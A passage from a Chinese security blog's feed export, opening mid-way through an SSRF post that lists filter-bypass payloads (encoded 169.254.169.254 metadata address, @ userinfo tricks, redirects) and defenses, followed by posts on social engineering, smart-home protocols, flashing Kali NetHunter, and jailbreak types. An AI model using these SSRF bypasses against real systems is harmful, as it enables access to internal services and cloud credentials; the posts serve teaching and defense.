<p>利用Enclosed alphanumerics<br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com<br><a href="http://169.254.169.254>>>http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</a><br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</p>
</blockquote>
<p>9.当限制为<a class="link"   href="http://www.xxx.com/" >http://www.xxx.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 域名</p>
<blockquote>
<p>采用http基本身份认证的方式绕过，即@<br><a class="link"   href="http://www.xxx.com@www.xxc.com/" >http://www.xxx.com@www.xxc.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>10.当限制请求IP不为内网地址</p>
<blockquote>
<p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p>
</blockquote>
<p>11.当限制请求只为http协议</p>
<blockquote>
<p>（1）采取302跳转<br>（2）采取短地址</p>
</blockquote>
<h2 id="漏洞防御办法"><a href="#漏洞防御办法" class="headerlink" title="漏洞防御办法"></a>漏洞防御办法</h2><p>根据以上攻击手段，ssrf 的防御办法如下：<br>1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>2, 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
<p>3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p>
<p>4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p>
<p>5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:&#x2F;&#x2F;&#x2F;,gopher:&#x2F;&#x2F;,ftp:&#x2F;&#x2F; 等引起的问题</p>
<p>总而言之，对用户输入的url进行严格限制，一方面要严防用户输入的内容在白名单之中，另一方面要严格显示用户权限，不允许用户访问权限以外的内容。</p>
<p>那么这回，面试官再问ssrf，知道怎么回答了吗？</p>
<p>参考：</p>
<p><a class="link"   href="https://evilcos.me/?p=221" >https://evilcos.me/?p=221 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#heading=h.mytbih9w7xb0" >https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#heading=h.mytbih9w7xb0 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-1/" >https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-1/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://xz.aliyun.com/t/12227" >https://xz.aliyun.com/t/12227 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.lmlphp.com/user/64107/article/item/1251173/" >https://www.lmlphp.com/user/64107/article/item/1251173/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://github.com/JoyChou93/java-sec-code" >https://github.com/JoyChou93/java-sec-code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   href="https://www.secpulse.com/archives/65832.html" >https://www.secpulse.com/archives/65832.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>关于社会工程学的一些个人看法</title>
    <url>/2023/04/23/%E5%85%B3%E4%BA%8E%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%AA%E4%BA%BA%E7%9C%8B%E6%B3%95/</url>
    <content><![CDATA[<p>从何讲起呢？<br>本人从上学时了解到社会工程学这门黑客学科<br>社会工程学是指，利用人性的弱点和特性，直接对目标相关的人进行社会关系和心理学的信息套取的手段。<br>主要行动方向有两条，一方面是从目标人物已经完成的社会行为中搜索关键信息，比如，找到目标人物的网络社交账号与发表的信息等。<br>另一方面是直接接触目标人物，通过语言或肢体交流进行信息套取，这里从广泛的意义上讲，电信诈骗也是应用案例之一。</p>
<p>我不想讲社工中的那些方法论，那些东西太死板，交给乙方公司的安服团队，公司会用这种方法完成他们的变现。</p>
<p>而我想表达的内容应该更适合还在学习社工，并纠结与社工工作的人。</p>
<p>首先要说的是，社工不难，而且很灵活，你通过自己的办法去发现那些信息就已经是天花板了。从互联网空间中能找到信息，一方面是互联网公司自身对客户的信息保护不够，另一方面是目标对自身信息的保护不够。<br>比如，你通过穷举法获取目标的平台账号密码，是互联网公司的措施不完善。<br>又比如，你在目标社交平台上发布的生活轨迹中发现关键信息，是目标本身对敏感信息的敏感度不足造成的。</p>
<p>而通过这两种思路，组合打法就能帮你获取到足够多的信息了。</p>
<p>之后要说的是，请你记住你要获取信息的目的，你只是想拿到那个password，或者拿到某个关键目标放在什么位置，或者是目标公司老板几点在公司这种信息而已。</p>
<p>而获取信息的渠道很多，你千万不要陷入到给获取目标渠道中的这个人的人物画像当中去，那不应该是你的主要工作。</p>
<p>可能护网工作会要求你充分溯源红队人员的个人信息，但你在做溯源的时候，只要知道是红队中的谁攻击，用的什么手段攻击即可。不需要疯狂地去完善报告中他的生活细节。可能你想通过这种方式来表现你的工作能力。<br>而护网中，真的没人在意这个人年龄多大，家里几个人，婚否，对象好不好看，喜不喜欢烟酒二次元等乱七八糟的事情。</p>
<p>因为当你花费了大量的时间在这上面，并把一份详细且完整的画像报告交上去时，你的主管回复你，你找错目标了。请问你花费的时间和精力要谁来买单呢？</p>
<p>不仅仅是护网工作，你会发现能用到社工手段的地方太多了，因为这个手段门槛太低，不需要你会多少计算机语言，不需要你懂不懂什么OSI七层协议框架。你只要动手去做，无论找不找得到目标信息，你都会有一定的收获。</p>
<p>比如，你很想知道喜欢的人，这个人网络上发布了什么，喜好什么，最近在做什么。你很强，你把这些信息都拿到了，然后呢？你会发现一个很严重的问题，这些信息要怎么利用？这些信息是否真实？这些信息有多少是他想表现在网络上，而真正的信息都藏起来根本不会发布。</p>
<p>于是你又开始分析信息，分析行为，分析社会关系，甚至开始根据这些信息开始侧写。</p>
<p>这个时候，如果你不是为了相关工作去调查犯罪嫌疑人，那你已经是一个不折不扣的大变态了。</p>
<p>你只是为了满足你那肮脏不堪的窥私欲而已。</p>
<p>这些信息看得多了，你会发现人性的不堪，因为你会发现很多人被自身的欲望裹挟而做出的徘徊于人性边缘的事情。你开始会对每一个人都保持距离感，并对人性保持一种相当的怀疑态度。</p>
<p>没错，你走火入魔了，你太依赖于社会工程学了。</p>
<p>我要说的是，社工是一门手段，但不是万金油。</p>
<p>企业可以通过相应的管理制度来规避社工攻击带来的风险，人本身也可以通过学习相关知识并改变生活中的一些行为来规避社工攻击。同时，我上面讲过，人在网络上表达的内容仅仅是想让你看到的内容，那并不是真实的。</p>
<p>以上，</p>
<p>在我对自身的社工防范手段做到位了之后，就不在社工这件事本身再投入精力了。</p>
<p>毕竟把太多的精力放在对人的信息挖掘上，目光未免太过狭窄。</p>
<p>地球在宇宙中存在了46亿年，陆地总面积约14900万平方千米，地球总人口约78.88亿，人类平均寿命大约是76岁，你大约已经用掉了30%，那么你大约还有五十多年的时间，去了解历史、丈量土地、遇见更多的人。</p>
<p>在此希望你能为祖国健康工作50年。</p>
]]></content>
  </entry>
  <entry>
    <title>由智能家居入门物联网安全（没写完，是个半成品</title>
    <url>/2023/04/23/%E7%94%B1%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85%E5%85%A5%E9%97%A8%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h2 id="何为智能家居"><a href="#何为智能家居" class="headerlink" title="何为智能家居"></a>何为智能家居</h2><p>智能家居（smart home, home automation）是以住宅为平台，利用综合布线技术、网络通信技术、 安全防范技术、自动控制技术、音视频技术将家居生活有关的设施集成，构建高效的住宅设施与家庭日程事务的管理系统，提升家居安全性、便利性、舒适性、艺术性，并实现环保节能的居住环境。</p>
<h2 id="何为物联网"><a href="#何为物联网" class="headerlink" title="何为物联网"></a>何为物联网</h2><p>物联网技术（Internet of Things，IoT）起源于传媒领域，是信息科技产业的第三次革命。物联网是指通过信息传感设备，按约定的协议，将任何物体与网络相连接，物体通过信息传播媒介进行信息交换和通信，以实现智能化识别、定位、跟踪、监管等功能。</p>
<h2 id="智能家居用到的通信协议"><a href="#智能家居用到的通信协议" class="headerlink" title="智能家居用到的通信协议"></a>智能家居用到的通信协议</h2><p>无线协议</p>
<p>一、Wifi技术</p>
<p>　　生活中最常见的无线协议。采用的是国内2.4G免费频段，直接连入互联网，手机下载APP，就可以直接进行控制。Wifi最初就是为了实现大数据在小范围内的无线传输而设计的，所以设计之初并没有考虑其他的因素。以至于应用到目前智能家居系统并不是很合适。Wifi只支持星型网络拓扑结构，通过多基站的方式实现网络空间拓展。协议稳定性、安全性比较差，容易断开连接，被人破解。wifi在功率消耗上面能耗巨大，假如家里面安装了许多的wifi产品，那么一个月下来用电量都不可小视。Wifi设计只有16个信道，而且其中有一个是占用的，理论上是可以连接15个产品但是实际中连接10个就极不稳定了。一个家庭产品上面远远不止10个。Wifi的穿墙能力和衍射能力较弱等等，这些方面就足以说明wifi不适合做智能家居系统。</p>
<p>　　二、蓝牙技术</p>
<p>　　蓝牙也是生活中最常见的协议，接触最多的就是手机蓝牙配对和蓝牙音箱了，通过短距离的无线通讯，可以传输大数据，为生活带来了许多便捷之处。蓝牙的功耗低于wifi，传输距离较近，一般低于10米，无法进行组网，其次蓝牙堆栈(stack)很容易奔溃。蓝牙节点也比较少，在稳定性和受干扰能力方面也不是很强。所以不适合做成智能家居系统。</p>
<p>　　三、射频433</p>
<p>　　433MHz的显著优势是无线信号的穿透性强、能够传播得更远。但其缺点也是很明显的，就是其数据传输速率只有9600bps，因此433Mhz技术一般只适用于数据传输量较少的应用场合。从通讯可靠性的角度来讲，433Mhz技术和WiFi一样，只支持星型网络的拓扑结构，通过多基站的方式实现网络覆盖空间的扩展，因此其无线通讯的可靠性和稳定性也逊于Z-Wave与Zigbee技术。另外，不同于Z-Wave，Zigbee和WiFi技术中所采用的加密功能，433MHZ系统，它的致命弱点是系统安全保密性差，很容易被攻击，被破译。</p>
<p>　　四、z-wave协议</p>
<p>　　Zwave的数据传输速率为9.6kbps，信号的有效覆盖在室内30米（室外大于100米），适用于窄带宽应用场合，且具备一定的安全性和稳定性，不过目前只应用于家庭自动化方面。究其缺点主要有三个：①是节点较少，理论值为256个，实际值可能只有150个左右，算是其能容纳设备数量的上限，实际上很多厂商能做到容纳20、30个设备就不错了。②是树状组网结构，一旦树枝上端断掉，下端的所有设备将无法与网关通信。③是没有加密方式，安全性差，易受到攻击。（Zwave所用频段在我国是非民用的，国内Zwave智能家居并不常见，更多的还是应用在国外。）</p>
<p>　　五、ZigBee协议</p>
<p>　　在智能家居领域，ZigBee协议是公认的目前最适合的协议之一。Zigbee具备双向通讯的能力，不仅能发送命令到设备，同时设备也会把执行状态反馈回来，这对终端使用体验至关重要，尤其是安防设备，倘若你点击了关门，却不知道门是否真的已经锁上，将会带来多大的安全隐患；此外，Zigbee采用了极低功耗设计，可以全电池供电，理论上一节电池能使用10年以上，节能环保。ZigBee介质存取层网络拓扑结构多样，分为星状拓扑结构，树状拓扑结构和网状拓扑结构。在信号传输方面，ZigBee的每一个产品都是一个中继器，产品之间信号可以连跳7次，所以ZigBee协议节点具有多达65000个，但是实际应用中200-300个节点时稳定性上就会衰减。ZigBee网络节点不仅本身可以作为监控对象，还可以自动中转别的网络节点传过来的数据资料。采用扩频技术对ZigBee的抗干扰能力进行改进和完善，可以起到避开干扰的作用。当系统网络受到干扰时，整个网络整以动态的方式切换到另一信道上。在安全性上面采用AES128位高级加密法，确保了整个系统的安全可靠。</p>
<p>　　综上所述：ZigBee协议具有自组网能力，安全性、可靠性高，抗干扰能力，自我恢复能力都比较强。具有极低的功耗，因此也是目前国内最适合智能家居的无线通讯协议。</p>
<p>　　6、EnOcean：2012年3月，国际电工技术委员会将EnOcean无线通信标准采纳为国际标准“ISO&#x2F;IEC 14543-3-10”[1] ，这也是世界上唯一使用能量采集技术的无线国际标准。</p>
<p>　　EnOcean技术和同类技术相比，功耗最低，传输距离最远，可以组网并且支持中继等功能，主要应用在一些无线无源智能家居和智能楼宇产品上。</p>
<p>　　7、Lora：LoRa 是LPWAN通信技术中的一种，是美国Semtech公司采用和推广的一种基于扩频技术的超远距离无线传输方案。这一方案改变了以往关于传输距离与功耗的折衷考虑方式，为用户提供一种简单的能实现远距离、长电池寿命、大容量的系统，进而扩展传感网络。目前，LoRa 主要在全球免费频段运行，包括433、868、915 MHz等。</p>
<p>　　LoRa技术具有远距离、低功耗（电池寿命长）、多节点、低成本的特性。</p>
<p>　　8、NB-IOT：基于蜂窝的窄带物联网（Narrow Band Internet of Things, NB-IoT）,NB-IoT构建于蜂窝网络，只消耗大约180KHz的带宽，可直接部署于GSM网络、UMTS网络或LTE网络，以降低部署成本、实现平滑升级。</p>
<p>　　NB-IoT是IoT领域一个新兴的技术，支持低功耗设备在广域网的蜂窝数据连接，也被叫作低功耗广域网(LPWAN)。NB-IoT支持待机时间长、对网络连接要求较高设备的高效连接。据说NB-IoT设备电池寿命可以提高至至少10年，同时还能提供非常全面的室内蜂窝数据连接覆盖。</p>
<p>　　NB-IoT具备四大特点：一是广覆盖，将提供改进的室内覆盖，在同样的频段下，NB-IoT比现有的网络增益20dB，相当于提升了100倍覆盖区域的能力；二是具备支撑海量连接的能力，NB-IoT一个扇区能够支持10万个连接，支持低延时敏感度、超低的设备成本、低设备功耗和优化的网络架构；三是更低功耗，NB-IoT终端模块的待机时间可长达10年；四是更低的模块成本，企业预期的单个接连模块不超过5美元。</p>
<p>　　NB-IOT聚焦于低功耗广覆盖（LPWA）物联网（IOT）市场，是一种可在全球范围内广泛应用的新兴技术。其具有覆盖广、连接多、速率低、成本低、功耗低、架构优等特点。NB-IOT使用License频段，可采取带内、保护带或独立载波三种部署方式，与现有网络共存。</p>
<p>有线协议</p>
<p>1、RS485：RS-485又名TIA-485-A, ANSI&#x2F;TIA&#x2F;EIA-485或TIA&#x2F;EIA-485。</p>
<p>　　RS485是一个定义平衡数字多点系统中的驱动器和接收器的电气特性的标准，该标准由电信行业协会和电子工业联盟定义。使用该标准的数字通信网络能在远距离条件下以及电子噪声大的环境下有效传输信号。RS-485使得廉价本地网络以及多支路通信链路的配置成为可能。</p>
<p>　　RS485有两线制和四线制两种接线，四线制只能实现点对点的通信方式，现很少采用，现在多采用的是两线制接线方式，这种接线方式为总线式拓扑结构，在同一总线上最多可以挂接32个节点。</p>
<p>　　很多主流的有线智能家居厂家采用的都是RS485协议。</p>
<p>　　2、RS232：个人计算机上的通讯接口之一，由电子工业协会所制定的异步传输标准接口。通常 RS-232 接口以9个引脚 (DB-9) 或是25个引脚 (DB-25) 的型态出现，一般个人计算机上会有两组 RS-232 接口，分别称为 COM1 和 COM2。很多老式电脑的接口用的就是这种通讯协议。少数的智能家居产品会采用这种协议。</p>
<p>　　3、Modbus：Modbus是由Modicon（现为施耐德电气公司的一个品牌）在1979年发明的，是全球第一个真正用于工业现场的总线协议。</p>
<p>　　ModBus网络是一个工业通信系统，由带智能终端的可编程序控制器和计算机通过公用线路或局部专用线路连接而成。其系统结构既包括硬件、亦包括软件。它可应用于各种数据采集和过程监控。</p>
<p>　　ModBus网络只有一个主机，所有通信都由他发出。网络可支持247个之多的远程从属控制器，但实际所支持的从机数要由所用通信设备决定。采用这个系统，各PC可以和中心主机交换信息而不影响各PC执行本身的控制任务。</p>
<p>　　4、KNX：1999年5月，欧洲三大总线协议EIB、BatiBus和EHSA合并成立了Konnex协会，提出了KNX协议。该协议以EIB为基础，兼顾了BatiBus和EHSA的物理层规范，并吸收了BatiBus和EHSA中配置模式等优点，提供了家庭、楼宇自动化的完整解决方案。</p>
<p>　　KNX 总线是独立于制造商和应用领域的系统。 通过所有的总线设备连接到 KNX 介质上 ( 这些介质包括双绞线、射频、电力线或 IP&#x2F;Ethernet), 它们可以进行信息交换。总线设备可以是传感器也可以是执行器，用于控制楼宇管理装置如： 照明 , 、遮光 &#x2F; 百叶窗、保安系统、能源管理、 供暖、通风、空调系统、信号和监控系统、服务界面及楼宇控制系统、远程控制、计量、视频 &#x2F; 音频控制、大型家电等。所有这些功能通过一个统一的系统就可以进行控制、监视和发送信号，不需要额外的控制中心。</p>
<h2 id="了解ZigBee协议"><a href="#了解ZigBee协议" class="headerlink" title="了解ZigBee协议"></a>了解ZigBee协议</h2><h2 id="了解MQTT协议"><a href="#了解MQTT协议" class="headerlink" title="了解MQTT协议"></a>了解MQTT协议</h2><h2 id="中控系统"><a href="#中控系统" class="headerlink" title="中控系统"></a>中控系统</h2><h2 id="中控系统的搭建"><a href="#中控系统的搭建" class="headerlink" title="中控系统的搭建"></a>中控系统的搭建</h2><h2 id="环境中存在的隐患"><a href="#环境中存在的隐患" class="headerlink" title="环境中存在的隐患"></a>环境中存在的隐患</h2><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>没写完，是个半成品</p>
<blockquote>
<p>参考：</p>
</blockquote>
<p><a class="link"   href="https://baike.baidu.com/item/%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85/686345?fr=aladdin" >https://baike.baidu.com/item/%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85/686345?fr=aladdin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>简单记录pixel 3XL刷KaliNetHunter的过程</title>
    <url>/2023/04/23/%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95pixel-3XL%E5%88%B7KaliNetHunter%E7%9A%84%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h2><p>根据kali官方介绍，目前已有大佬开发出相应的kernel用来支持kalinethunter的安装<br><a class="link"   href="https://nethunter.kali.org/kernels.html" >https://nethunter.kali.org/kernels.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327192859.1x5kw9e5q1gg.webp"
                      alt="Pasted image 20230327192859" 
                ><figcaption>Pasted image 20230327192859</figcaption></figure></p>
<p>我的pixel3XL刚好就在这里<br>那就好办了，<br>看看环境需求：<br>刷原生Android12，刷大佬的kernel<br>看看大佬的介绍页怎么写的：<br><a class="link"   href="https://forum.xda-developers.com/t/kernel-nethunter-for-pixel-3-and-pixel-3-xl-blueline-crosshatch.4456799/" >https://forum.xda-developers.com/t/kernel-nethunter-for-pixel-3-and-pixel-3-xl-blueline-crosshatch.4456799/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327193057.2i6h1bvt4zs0.webp"
                      alt="Pasted image 20230327193057" 
                ><figcaption>Pasted image 20230327193057</figcaption></figure></p>
<p>需要先用twrp把他的kernel相关文件刷进去<br>然后安装busybox<br>安装Wireless_firmware.zip<br>安装nethunter相关软件<br>升级<br>重启</p>
<p>再看看大佬的gayhub<br><a class="link"   href="https://github.com/V3rB0se/Alynx-Nethunter" >https://github.com/V3rB0se/Alynx-Nethunter <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327194001.5295ygwtwsw0.webp"
                      alt="Pasted image 20230327194001" 
                ><figcaption>Pasted image 20230327194001</figcaption></figure></p>
<p>那就好办了，需要的文件都提供了，开搞！</p>
<p>twrp的安装本身是个问题，因为官方也说了，安不进去，需要了刷两遍，前提是刷进第三方系统<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://github.com/BrathonBai/ImgHS/raw/main/content/pixel_kali/Pasted image 20230327192630.4u3n6zytawa0.webp"
                      alt="Pasted image 20230327192630" 
                ><figcaption>Pasted image 20230327192630</figcaption></figure></p>
<p>那我就用lineageos先搞一下，避免之后不能root</p>
<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="刷第三方系统"><a href="#刷第三方系统" class="headerlink" title="刷第三方系统"></a>刷第三方系统</h3><p>根据LineageOS安装引导，<br>下载对应版本的img和zip，准备导入</p>
<p>重启至bootloader</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure></div>

<p>刷镜像进去</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastboot flash boot &lt;name&gt;.img</span><br></pre></td></tr></table></figure></div>

<p>然后重启到Recovery Mod<br>点击Factory Reset，再Format data &#x2F; factory reset，恢复出厂设置，格式化数据<br>回到主菜单，找 Apply from ADB</p>
<p>然后侧载文件</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb sideload &lt;name&gt;.zip</span><br></pre></td></tr></table></figure></div>
<p>侧载结束，第三方系统安装完毕，准备安装twrp</p>
<h3 id="刷twrp"><a href="#刷twrp" class="headerlink" title="刷twrp"></a>刷twrp</h3><p>twrp的安装稍微又些棘手，不过可以借用lineageOS的boot来解决。<br>同样是使用侧载功能</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb sideload twrp.img</span><br></pre></td></tr></table></figure></div>
<p>这样安装的twrp是可以使用的，但会覆盖掉lineageOS的分区，此时就要注意<br>twrp侧载安装会覆盖a、b两个分区，所以之后又要用LineageOS的img再刷一次，以保证系统的正常启动。</p>
<p>twrp侧载之后，使用adb，将后续需要安装的包一股脑全都放进去</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb push &lt;要导入的包&gt; /path</span><br></pre></td></tr></table></figure></div>
<p>这里包括Alynx-12-nethunter-bluecross.zip、Wireless_firmware.zip、Magisk-v25.2.apk</p>
<p>由于twrp已经覆盖了a、b两个区，后续启动是个问题，用fastboot再次覆盖安装lineageOS<br>就可以引导启动系统，并开始Magisk的操作</p>
<p>启动Magick app，修复引导镜像，<br>使用adb把镜像拉到pc上，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb pull &lt;magick-什么玩应来着&gt;.img</span><br></pre></td></tr></table></figure></div>
<p>使用fastboot，把这个镜像安装到recovery区</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastboot flash recovery &lt;magick-什么玩应来着&gt;.img</span><br></pre></td></tr></table></figure></div>

<p>再次启动系统，应该就能root了</p>
<p>然后再看F-Droid这个app，进入后安装nethunter store<br>后面的懒得教了，一看就知道<br>大不了全装了</p>
]]></content>
  </entry>
  <entry>
    <title>苹果端的越狱到frida hook</title>
    <url>/2023/04/23/%E8%8B%B9%E6%9E%9C%E7%AB%AF%E7%9A%84%E8%B6%8A%E7%8B%B1%E5%88%B0frida-hook/</url>
    <content><![CDATA[<h2 id="What-are-the-different-types"><a href="#What-are-the-different-types" class="headerlink" title="What are the different types?"></a>What are the different types?</h2><ul>
<li>Fully Untethered</li>
<li>Semi-Untethered</li>
<li>Semi-Tethered</li>
<li>Tethered</li>
</ul>
<h3 id="Untethered-Jailbreaks"><a href="#Untethered-Jailbreaks" class="headerlink" title="Untethered Jailbreaks"></a>Untethered Jailbreaks</h3><hr>
<p>Untethered jailbreaks can be considered the holy grail of all jailbreaks. They only require the exploit to be ran once either via a website, an app or a computer.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://ios.cfw.guide/assets/images/p0sixpwn.png"
                      alt="A screenshot of the p0sixspwn jailbreak"
                ><figcaption>A screenshot of the p0sixspwn jailbreak</figcaption></figure></p>
<p>After that, your device is fully jailbroken and won’t require any further action. The exploit will stay on a device even after you reboot it.</p>
<p>Unfortunately, there hasn’t been a new untethered jailbreak in a very long time, and it’s likely we won’t see one for even longer.</p>
<p>The only downside to an untethered jailbreak is that if something goes wrong, it could very well result in a bootloop requiring you to restore your device via iTunes or Finder (macOS Catalina or newer). The likelihood of this happening is <em>low</em>, but is indeed possible.</p>
<p>A few examples of untethered jailbreaks are <a class="link"   href="https://ios.cfw.guide/installing-p0sixspwn" >p0sixspwn <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and Pangu9.</p>
<h3 id="Semi-Untethered-Jailbreaks"><a href="#Semi-Untethered-Jailbreaks" class="headerlink" title="#Semi-Untethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#semi-untethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Semi-Untethered Jailbreaks</h3><hr>
<p>Semi-untethered jailbreaks have been the most popular type of jailbreak in recent years. This type of jailbreak requires an exploit to be executed every time you reboot or turn off your device.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://ios.cfw.guide/assets/images/odysseymain.png"
                      alt="A screenshot of the Odyssey jailbreak"
                ><figcaption>A screenshot of the Odyssey jailbreak</figcaption></figure></p>
<p>This jailbreak works by running the exploit through an app on the device itself. The app, however, must be resigned every 7 days if sideloaded with a standard Apple ID. Utilities like AltStore, ReProvision Reborn, and AltDaemon make this process far easier.</p>
<p>Due to the nature of how the exploit is applied, these jailbreaks are easily removable through their respective app.</p>
<p>A few examples of semi-untethered jailbreaks include <a class="link"   href="https://ios.cfw.guide/installing-taurine" >Taurine <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link"   href="https://ios.cfw.guide/installing-unc0ver" >unc0ver <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, and <a class="link"   href="https://ios.cfw.guide/installing-odyssey" >Odyssey <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
<h3 id="Semi-Tethered-Jailbreaks"><a href="#Semi-Tethered-Jailbreaks" class="headerlink" title="#Semi-Tethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#semi-tethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Semi-Tethered Jailbreaks</h3><hr>
<p>Semi-tethered jailbreaks are very similar to semi-untethered jailbreaks, however the exploit must be ran using a computer rather than using a sideloaded app.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://ios.cfw.guide/assets/images/checkra1n.png"
                      alt="A screenshot of the checkra1n jailbreak"
                ><figcaption>A screenshot of the checkra1n jailbreak</figcaption></figure></p>
<p>Due to requiring a computer to rejailbreak after every reboot, most choose to use a semi-untethered jailbreak instead.</p>
<p>An example of a semi-tethered jailbreak is <a class="link"   href="https://ios.cfw.guide/installing-odysseyra1n" >Odysseyra1n <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
<h3 id="Tethered-Jailbreaks"><a href="#Tethered-Jailbreaks" class="headerlink" title="#Tethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#tethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Tethered Jailbreaks</h3><hr>
